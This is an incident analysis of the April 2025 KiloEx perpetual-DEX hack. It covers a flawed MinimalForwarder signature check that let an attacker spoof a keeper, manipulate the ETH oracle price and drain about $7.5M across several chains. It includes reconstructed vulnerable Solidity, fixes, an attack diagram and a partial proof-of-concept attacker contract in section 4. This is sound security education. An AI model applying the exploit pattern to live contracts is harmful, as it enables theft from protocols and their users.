# KiloEx — Access Control Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2025-04-14 |
| **Protocol** | KiloEx (Perpetual Trading DEX) |
| **Chain** | Base, BNB Chain, opBNB, Taiko (multi-chain) |
| **Loss** | $7,491,500 (Base $3.13M + opBNB $2.9M + BNB $0.89M + others) |
| **Attacker** | [0x00fac9...bcbd](https://basescan.org/address/0x00fac92881556a90fdb19eae9f23640b95b4bcbd) |
| **Attack Tx (Base)** | [0x6b378c...8edd](https://basescan.org/tx/0x6b378c84aa57097fb5845f285476e33d6832b8090d36d02fe0e1aed909228edd) |
| **Attack Tx (BNB)** | [0x1aaf5d...bc0](https://bscscan.com/tx/0x1aaf5d1dc3cd07feb5530fbd6aa09d48b02cbd232f78a40c6ce8e12c55927d03) |
| **Vulnerable Contract** | [MinimalForwarder 0x3274b6...c8](https://basescan.org/address/0x3274b668aed85479e2a8511e74d7db7240ebe7c8) |
| **Victim Contract** | [KiloEx Vault 0xdf5ACC...bbb](https://basescan.org/address/0xdf5acc616cd3ea9556ec340a11b54859a393ebbb) |
| **Root Cause** | Unauthorized price feed manipulation due to insufficient signature verification in `MinimalForwarder.execute()` |
| **Funding Source** | Tornado Cash (pre-funded on 2025-04-13) |

---

## 1. Vulnerability Overview

KiloEx is a perpetual trading DEX deployed across multiple chains including Base, BNB Chain, opBNB, and Taiko. On April 14, 2025, an attacker exploited an access control flaw in the `MinimalForwarder` contract to gain unauthorized access to KiloEx's price oracle via the `KiloPriceFeed.setPrices()` function.

### Vulnerability Chain

| Stage | Vulnerability | Impact |
|------|--------|------|
| Primary | `MinimalForwarder.execute()` — missing signature verification (access control flaw) | Arbitrary contract calls possible |
| Secondary | `KiloPriceFeed.setPrices()` — keeper privilege bypass via Forwarder | Arbitrary ETH price manipulation possible |
| Outcome | Leveraged position open/close using manipulated oracle prices | $7.49M drained across multiple chains |

`MinimalForwarder` is a meta-transaction relay contract inheriting from OpenZeppelin's `MinimalForwarderUpgradeable`. Its original design intent was gas fee sponsorship; however, the `execute` function did not properly implement signature verification logic, allowing the attacker to supply **an arbitrary `from` address and a reusable signature**.

---

## 2. Vulnerable Code Analysis

### 2.1 MinimalForwarder.execute() — Core Vulnerability

**Vulnerable code (reconstructed)**:
```solidity
// ❌ Vulnerable: signature verification logic does not properly bind the from address to the actual data
contract MinimalForwarder is MinimalForwarderUpgradeable {

    struct ForwardRequest {
        address from;   // address to impersonate as caller
        address to;     // target contract
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes   data;   // calldata to execute
    }

    function execute(ForwardRequest calldata req, bytes calldata signature)
        public
        payable
        returns (bool, bytes memory)
    {
        // ❌ Vulnerable point 1: signature is not actually bound to req.data, or
        //    a valid signature already exposed on-chain can be reused
        require(verify(req, signature), "MinimalForwarder: signature does not match request");

        // ❌ Vulnerable point 2: nonce validation is missing or bypassable
        // _nonces[req.from] increment is missing or validation is circumvented

        (bool success, bytes memory returndata) = req.to.call{
            gas: req.gas,
            value: req.value
        }(
            // ❌ Vulnerable point 3: msg.sender is replaced with req.from
            // PositionKeeper trusts this forwarder, so it recognizes it as a keeper
            abi.encodePacked(req.data, req.from)
        );

        return (success, returndata);
    }
}
```

**Fixed code**:
```solidity
// ✅ Fixed: EIP-712 typed data signature verification + replay prevention
contract MinimalForwarder is MinimalForwarderUpgradeable {

    // ✅ EIP-712 domain-separated signature including struct hash
    bytes32 private constant _TYPEHASH =
        keccak256("ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,bytes data)");

    mapping(address => uint256) private _nonces;

    function verify(ForwardRequest calldata req, bytes calldata signature)
        public view returns (bool)
    {
        address signer = _hashTypedDataV4(
            keccak256(abi.encode(
                _TYPEHASH,
                req.from, req.to, req.value, req.gas,
                _nonces[req.from],  // ✅ current nonce included — replay not possible
                keccak256(req.data) // ✅ data hash included — data tampering not possible
            ))
        ).recover(signature);
        return _nonces[req.from] == req.nonce && signer == req.from;
    }

    function execute(ForwardRequest calldata req, bytes calldata signature)
        public payable returns (bool, bytes memory)
    {
        require(verify(req, signature), "Signature verification failed");
        _nonces[req.from]++; // ✅ nonce consumed immediately

        (bool success, bytes memory returndata) = req.to.call{gas: req.gas, value: req.value}(
            abi.encodePacked(req.data, req.from)
        );
        return (success, returndata);
    }
}
```

**Problem**: The `execute` function verified the signature and `req.data` independently, allowing an attacker to reuse a **valid signature** observed on-chain and substitute arbitrary `req.to` and `req.data` values. The root cause was inheriting from OpenZeppelin's `MinimalForwarderUpgradeable` without proper overrides.

---

### 2.2 KiloPriceFeed.setPrices() — Oracle Access Control Bypass

**Vulnerable code (reconstructed)**:
```solidity
// ❌ Vulnerable: onlyKeeper cannot prevent spoofed calls via MinimalForwarder
contract KiloPriceFeed {

    mapping(address => bool) public isKeeper;

    modifier onlyKeeper() {
        // ❌ If msg.sender is MinimalForwarder and
        //    the from address appended by MinimalForwarder to calldata is a keeper,
        //    authentication can be bypassed
        address sender = _msgSender(); // uses ERC2771 context
        require(isKeeper[sender], "KiloPriceFeed: not keeper");
        _;
    }

    // Update all token prices at once
    function setPrices(
        address[] memory tokens,
        uint256[] memory prices,
        uint256 timestamp
    ) external onlyKeeper {
        for (uint256 i = 0; i < tokens.length; i++) {
            tokenPrices[tokens[i]] = prices[i];
        }
        lastUpdated = timestamp;
    }
}
```

**Fixed code**:
```solidity
// ✅ Fixed: explicitly remove ERC2771 Forwarder from the trusted list, or
//           add direct signature verification
contract KiloPriceFeed {

    // ✅ Fix 1: hard-code isTrustedForwarder to false, or
    //            explicitly block oracle updates via Forwarder
    function isTrustedForwarder(address forwarder) public view override returns (bool) {
        return false; // price feed contract does not need meta-transactions
    }

    modifier onlyKeeper() {
        // ✅ Use msg.sender directly instead of ERC2771 context
        require(isKeeper[msg.sender], "KiloPriceFeed: not keeper");
        _;
    }

    // ✅ Fix 2: add timestamp freshness validation
    function setPrices(
        address[] memory tokens,
        uint256[] memory prices,
        uint256 timestamp
    ) external onlyKeeper {
        require(block.timestamp - timestamp <= MAX_STALENESS, "Price data expired"); // ✅ freshness check
        require(tokens.length == prices.length, "Array length mismatch");
        for (uint256 i = 0; i < tokens.length; i++) {
            require(prices[i] > 0, "Invalid price");
            tokenPrices[tokens[i]] = prices[i];
        }
        lastUpdated = timestamp;
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- **2025-04-13**: Attack funds (ETH) procured via Tornado Cash
- Attacker observed previously submitted valid `MinimalForwarder.execute()` transactions on-chain to collect **reusable signatures**
- Identified keeper address to impersonate: `0xac9fd279...` (PositionKeeper)

### 3.2 Execution Phase

```
[Attacker EOA: 0x00fac9...bcbd]
        │
        │ ① execute(ForwardRequest{
        │       from: <keeper address>,
        │       to: PositionKeeper,
        │       data: setPrices([ETH], [100 USD])
        │   }, <reused valid signature>)
        ▼
┌──────────────────────────────────────────┐
│  MinimalForwarder                        │
│  (0x3274b668...c8)                       │
│                                          │
│  ❌ Signature check passes (reuse allowed)│
│  ❌ Nonce not consumed (re-callable)      │
└──────────────┬───────────────────────────┘
               │ ② call(data + from_address)
               │    msg.sender = MinimalForwarder
               │    _msgSender() = keeper (spoofed)
               ▼
┌──────────────────────────────────────────┐
│  PositionKeeper                          │
│  (0xac9fd279...)                         │
│                                          │
│  Has keeper privilege → accesses KiloPriceFeed │
└──────────────┬───────────────────────────┘
               │ ③ setPrices([ETH], [100 USD])
               ▼
┌──────────────────────────────────────────┐
│  KiloPriceFeed                           │
│                                          │
│  ETH price: $2,500 → $100 (98% drop)    │
│  onlyKeeper passes (ERC2771 spoofed)     │
└──────────────┬───────────────────────────┘
               │
               │ ④ Open leveraged long position at extreme low price
               │    ETH @ $100 × max leverage
               ▼
┌──────────────────────────────────────────┐
│  KiloEx Perpetual Vault                  │
│  (0xdf5ACC...bbb)                        │
│                                          │
│  Position entry: buy ETH at $100         │
└──────────────┬───────────────────────────┘
               │
               │ ⑤ Re-call execute() (possible because nonce not consumed)
               │    setPrices([ETH], [10,000 USD])
               ▼
┌──────────────────────────────────────────┐
│  KiloPriceFeed                           │
│                                          │
│  ETH price: $100 → $10,000 (100x increase) │
└──────────────┬───────────────────────────┘
               │
               │ ⑥ Close position (100x leverage profit)
               ▼
┌──────────────────────────────────────────┐
│  KiloEx Perpetual Vault                  │
│                                          │
│  Profit realized: ~$3.13M (Base chain)  │
│  Vault funds drained                     │
└──────────────┬───────────────────────────┘
               │
               │ ⑦ Same attack repeated across multiple chains
               │    (BNB, opBNB, Taiko, Manta)
               ▼
┌──────────────────────────────────────────┐
│  Total funds stolen: $7,491,500          │
│                                          │
│  Fund movement: zkBridge / deBridge / Meson │
│  → Dispersed to 3 separate addresses    │
└──────────────────────────────────────────┘
```

### 3.3 Outcome

| Chain | Amount Stolen |
|------|----------|
| Base | $3,130,000 |
| opBNB | $2,900,000 |
| BNB Chain | $893,000 |
| Taiko | $41,000 |
| Others | ~$527,500 |
| **Total** | **$7,491,500** |

---

## 4. PoC Core Logic (Reconstructed)

```solidity
// [Attack contract core logic reconstructed — based on DeFiHackLabs]

interface IMinimalForwarder {
    struct ForwardRequest {
        address from;
        address to;
        uint256 value;
        uint256 gas;
        uint256 nonce;
        bytes data;
    }
    function execute(ForwardRequest calldata req, bytes calldata signature)
        external payable returns (bool, bytes memory);
    function getNonce(address from) external view returns (uint256);
}

interface IKiloPriceFeed {
    function setPrices(address[] memory tokens, uint256[] memory prices, uint256 timestamp) external;
}

contract KiloExAttacker {
    IMinimalForwarder constant forwarder =
        IMinimalForwarder(0x3274b668aed85479e2a8511e74d7db7240ebe7c8);

    address constant ETH_TOKEN = 0x4200000000000000000000000000000000000006; // WETH on Base
    address constant PRICE_FEED = /* KiloPriceFeed address */;
    address constant KEEPER_ADDR = /* keeper address observed on-chain */;

    function attack() external {
        // ① Reuse existing valid signature collected on-chain
        bytes memory stolenSignature = hex"..."; // existing keeper signature

        // ② Manipulate ETH price to $100 (for position entry)
        address[] memory tokens = new address[](1);
        uint256[] memory prices = new uint256[](1);
        tokens[0] = ETH_TOKEN;
        prices[0] = 100e8; // $100 (8 decimal places)

        bytes memory setPriceLowData = abi.encodeCall(
            IKiloPriceFeed.setPrices,
            (tokens, prices, block.timestamp)
        );

        // ③ Set low price by impersonating keeper via MinimalForwarder
        IMinimalForwarder.ForwardRequest memory req = IMinimalForwarder.ForwardRequest({
            from: KEEPER_ADDR,      // impersonate keeper address
            to: PRICE_FEED,
            value: 0,
            gas: 500000,
            nonce: forwarder.getNonce(KEEPER_ADDR), // current nonce (reusable)
            data: setPriceLowData
        });
        forwarder.execute(req, stolenSignature); // ❌ signature check passes

        // ④ Open ETH leveraged long position on KiloEx (based on $100)
        // kiloex.openPosition(ETH, LONG, MAX_LEVERAGE, ...)

        // ⑤ Manipulate ETH price to $10,000 (for position close)
        prices[0] = 10000e8; // $10,000
        bytes memory setPriceHighData = abi.encodeCall(
            IKiloPriceFeed.setPrices,
            (tokens, prices, block.timestamp)
        );
        req.data = setPriceHighData;
        // ❌ Same signature reusable because nonce was not consumed
        forwarder.execute(req, stolenSignature);

        // ⑥ Close leveraged position → realize profit
        // kiloex.closePosition(...) → ~$3.13M profit
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | MinimalForwarder insufficient signature verification (access control flaw) | CRITICAL | CWE-284 | `03_access_control.md` |
| V-02 | ERC2771 context misuse — keeper privilege spoofing | CRITICAL | CWE-290 | `03_access_control.md` |
| V-03 | Nonce reuse — Replay Attack permitted | HIGH | CWE-294 | `10_signature_replay.md` |
| V-04 | Oracle price manipulation — perpetual position exploit | HIGH | CWE-345 | `04_oracle_manipulation.md`, `20_trading_perpetual.md` |

### V-01: MinimalForwarder Insufficient Signature Verification

- **Description**: `MinimalForwarder.execute()` verified request data (`req.data`, `req.to`) and the signature independently, allowing a valid signature to be combined with arbitrary targets and data. While inheriting from OpenZeppelin's `MinimalForwarderUpgradeable`, proper EIP-712 typed hash verification was not implemented.
- **Impact**: Attacker can reuse a keeper's existing signature exposed on-chain to call arbitrary contract functions with keeper privileges
- **Attack Condition**: Only a single valid on-chain exposed signature is needed for unlimited reuse

### V-02: ERC2771 Context Misuse

- **Description**: `KiloPriceFeed` uses the ERC2771 standard (`_msgSender()`) to identify the caller, trusting the `from` address appended to calldata by `MinimalForwarder` as the actual sender. If the Forwarder itself is compromised, this entire trust model collapses.
- **Impact**: Any address can be impersonated as a keeper via `MinimalForwarder`
- **Attack Condition**: MinimalForwarder must be registered as a trusted Forwarder in KiloPriceFeed

### V-03: Nonce Reuse (Replay Attack)

- **Description**: During `execute()` calls, nonces were not consumed or validation was bypassable, allowing the same signature to call `execute()` multiple times.
- **Impact**: A single valid signature enables unlimited repeated attacks (two price manipulations: set low → set high)
- **Attack Condition**: Linked to V-01 — nonce reuse makes signature reuse even more devastating

### V-04: Oracle Price Manipulation → Perpetual Exploit

- **Description**: After gaining unauthorized access to `setPrices()`, the attacker set ETH price to an extreme low (entry) and then extreme high (exit) to extract illegitimate profit from leveraged positions.
- **Impact**: Losses proportional to leverage multiplier — 100x price manipulation with 100x leveraged position can drain the entire Vault
- **Attack Condition**: Requires setPrices access obtained via V-01/V-02/V-03

---

## 6. Remediation Recommendations

### Immediate Actions

**① Implement complete EIP-712 signature verification in MinimalForwarder**

```solidity
// ✅ Fixed: typed hash signature verification including data
bytes32 private constant FORWARD_REQUEST_TYPEHASH = keccak256(
    "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,bytes data)"
);

function _verifyRequest(ForwardRequest calldata req, bytes calldata sig)
    internal view returns (bool)
{
    bytes32 digest = _hashTypedDataV4(keccak256(abi.encode(
        FORWARD_REQUEST_TYPEHASH,
        req.from,
        req.to,
        req.value,
        req.gas,
        req.nonce,     // ✅ must match current nonce
        keccak256(req.data) // ✅ data hash included
    )));
    return SignatureChecker.isValidSignatureNow(req.from, digest, sig);
}
```

**② Guarantee atomic nonce consumption**

```solidity
function execute(ForwardRequest calldata req, bytes calldata sig)
    public payable returns (bool, bytes memory)
{
    require(_nonces[req.from] == req.nonce, "Nonce mismatch");
    require(_verifyRequest(req, sig), "Signature verification failed");
    _nonces[req.from]++; // ✅ nonce consumed immediately before execution
    // ...
}
```

**③ Remove Forwarder trust from the price feed contract**

```solidity
// ✅ Oracle contract does not need meta-transactions — disable ERC2771
contract KiloPriceFeed {
    // Always return false for isTrustedForwarder
    function isTrustedForwarder(address) public pure override returns (bool) {
        return false;
    }

    modifier onlyKeeper() {
        // ✅ Use msg.sender directly instead of ERC2771 _msgSender()
        require(isKeeper[msg.sender], "not keeper");
        _;
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Insufficient signature verification | Use OpenZeppelin `ERC2771Forwarder` (v5.x) — EIP-712 verification built-in |
| V-02: ERC2771 misuse | Completely remove ERC2771 from oracle and critical parameter setter contracts |
| V-03: Nonce reuse | Consume nonce immediately upon `execute()` entry (check → effects → interactions order) |
| V-04: Oracle manipulation | Dual oracle with Chainlink or other externally validated oracle; add price deviation circuit breaker |
| Multi-chain risk | Independent access control per chain; include chain ID in signature domain |
| Monitoring | Real-time alerts and automatic halt mechanism for abnormal price deviations (±50% or more) |

---

## 7. Lessons Learned

1. **Meta-transaction contracts require separate security audits**: Relay contracts like `MinimalForwarder` may appear simple, but they become the entry point for the entire trust model. Inheritance alone does not guarantee security, and the signature verification logic in `execute()` must be independently verified.

2. **Minimize the scope of ERC2771 application**: UI functions that require meta-transactions (gas sponsorship) and internal functions where trust is critical, such as oracle updates, must never share the same trust model. As a principle, ERC2771 should not be applied to price feed contracts.

3. **Signature replay attacks must always be considered**: Nonce-based signatures must be verified to ensure the nonce is actually being consumed, the chain ID is included, and `data` is within the signature scope. If any of these three elements is missing, the system is vulnerable to replay attacks.

4. **Oracle price deviation circuit breakers are essential**: Even if price feed manipulation succeeds, a circuit breaker that blocks price deviations of ±80% or more within a single block could have minimized the damage. In perpetual DEXs, the oracle is the most critical attack vector.

5. **Each chain requires independent verification in multi-chain deployments**: When deploying the same codebase across multiple chains, a single vulnerability can be exploited simultaneously across all chains. Independent audits after per-chain deployment, or per-chain control mechanisms, are required.

6. **Explicitly design the trust model for public interfaces**: Which contracts trust which other contracts (`isTrustedForwarder`, `isKeeper`) must be designed explicitly and with minimal scope. "Implicit trust" is a primary cause of security incidents.

---

## 8. On-Chain Verification

> This section presents cross-verified results based on publicly available analysis reports and block explorer data.

### 8.1 Key Transaction Summary

| Chain | Transaction Hash | Amount Stolen |
|------|-------------|----------|
| Base | [0x6b378c...8edd](https://basescan.org/tx/0x6b378c84aa57097fb5845f285476e33d6832b8090d36d02fe0e1aed909228edd) | $3,130,000 |
| Base | [0xde7f5e...26e6](https://basescan.org/tx/0xde7f5e78ea63cbdcd199f4b109db2a551b4462dec79e4dba37711f6c814b26e6) | $187,000 |
| BNB Chain | [0x1aaf5d...bc0](https://bscscan.com/tx/0x1aaf5d1dc3cd07feb5530fbd6aa09d48b02cbd232f78a40c6ce8e12c55927d03) | $893,000 |
| opBNB | [0x79eb28...964](https://opbnb.bscscan.com/tx/0x79eb28ae21698733048e2dae9f9fe3d913396dc9d93a0e30d659df6065127964) | $2,900,000 |
| Taiko | [0x9bce6e...15b](https://taikoscan.io/tx/0x9bce6e105cea138fe9fb1e4bfb63fe90d21817db9d2cc6d1bf7697317430215b) | $41,000 |

### 8.2 Fund Tracing

| Stage | Details |
|------|------|
| Funding | 2025-04-13 Tornado Cash → Attacker EOA |
| Attack Execution | 2025-04-14 Multi-chain attack |
| Fund Movement | Dispersed to 3 addresses via zkBridge / deBridge / Meson |
| Return Negotiation | KiloEx offered $750K bounty, requested 90% return |
| Return | Funds returned approximately 3.5 days after the attack |

### 8.3 Key Contract Addresses (Base Chain)

| Contract | Address |
|----------|------|
| MinimalForwarder (vulnerable) | [0x3274b668...c8](https://basescan.org/address/0x3274b668aed85479e2a8511e74d7db7240ebe7c8) |
| KiloEx Vault (victim) | [0xdf5ACC...bbb](https://basescan.org/address/0xdf5acc616cd3ea9556ec340a11b54859a393ebbb) |
| Attacker EOA | [0x00fac9...bcbd](https://basescan.org/address/0x00fac92881556a90fdb19eae9f23640b95b4bcbd) |

---

## References

- [Ackee Blockchain — Inside the $7.5M KiloEx Hack](https://ackee.xyz/blog/inside-the-7-5m-kiloex-hack/)
- [Halborn — Explained: The KiloEx Hack (April 2025)](https://www.halborn.com/blog/post/explained-the-kiloex-hack-april-2025)
- [QuillAudits — KiloEx Exploit Breakdown](https://www.quillaudits.com/blog/hack-analysis/kiloex-exploit-breakdown)
- [SolidityScan — KiloEx Vault Hack Analysis](https://blog.solidityscan.com/kiloex-vault-hack-analysis-123a086ccae3)
- [Rekt News — KiloEx Rekt](https://rekt.news/kiloex-rekt)
- [CoinDesk — KiloEx Loses $7M in Oracle Manipulation Attack](https://www.coindesk.com/markets/2025/04/15/dex-kiloex-loses-usd7m-in-apparent-oracle-manipulation-attack)
- [The Block — KiloEx Hacker Legal Pursuit](https://www.theblock.co/post/350807/kiloex-hacker-legal-pursuit)